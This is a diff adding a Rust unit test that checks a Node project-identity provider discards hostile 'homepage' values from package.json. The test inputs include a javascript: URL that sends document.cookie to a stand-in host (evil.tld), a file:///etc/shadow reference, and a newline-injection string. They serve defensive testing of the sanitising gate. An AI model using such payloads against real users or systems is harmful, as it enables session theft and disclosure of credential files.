@@ -162,6 +162,44 @@ mod tests {
         assert!(fields.iter().any(|f| f.id == "homepage"));
     }
 
+    /// SEC-2 / SEC-11 / TASK-2222: a hostile `homepage` must reach
+    /// `ProjectIdentity.homepage` as `None`. Drives the full provider path
+    /// (parse → `ParsedManifest` → deserialised identity) so the gate is
+    /// pinned at the surface `crates/core/src/project_identity/card.rs`
+    /// renders, not only inside the parser.
+    #[test]
+    fn provider_drops_hostile_homepage_from_identity() {
+        for homepage in [
+            // XSS sink.
+            "javascript:fetch('https://evil.tld/?c='+document.cookie)",
+            // Local resource disclosure.
+            "file:///etc/shadow",
+            // Forged extra line in the card / log records. Spelled with a
+            // JSON `\n` escape so the file parses and the *deserialised*
+            // value (a real LF) is what reaches the gate — a raw newline
+            // inside a JSON string is invalid JSON and would never get that
+            // far.
+            "https://demo.dev\\nINJECT",
+        ] {
+            let dir = tempfile::tempdir().unwrap();
+            write(
+                &dir.path().join("package.json"),
+                &format!("{{\"name\":\"x\",\"homepage\":\"{homepage}\"}}"),
+            );
+            let provider = NodeIdentityProvider;
+            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+            let id: ProjectIdentity =
+                serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+            assert!(
+                id.homepage.is_none(),
+                "hostile homepage {homepage:?} must reach identity as None"
+            );
+            // The rest of the identity still flows: dropping one field is
+            // degradation, not failure.
+            assert_eq!(id.name, "x");
+        }
+    }
+
     #[test]
     fn parse_minimal_package_json() {
         let dir = tempfile::tempdir().unwrap();
